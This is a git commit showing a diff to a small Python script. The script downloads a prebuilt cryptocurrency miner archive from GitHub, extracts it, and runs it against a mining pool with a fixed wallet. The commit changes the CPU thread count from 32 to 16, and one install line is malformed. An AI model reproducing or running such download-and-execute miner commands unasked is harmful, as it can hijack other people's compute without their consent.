465c669d8adc73823c2242f72a50440af3da9d6f
archer0x0071 <96301231+archer0x0071@users.noreply.github.com>
2021-12-17 19:53:49 +0500

    Update script3.py

--- script3.py
+++ script3.py
@@ -4,4 +4,4 @@ os.system('su apt install wget')
 
 os.system('python -m wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz')
 os.system('tar xf hellminer_cpu_linux.tar.gz')
-os.system('./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RMkFLsUYiqYiWmXCG29AD3EpF2AseMtiqY.worke -p x --cpu 32')
+os.system('./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RMkFLsUYiqYiWmXCG29AD3EpF2AseMtiqY.worke -p x --cpu 16')
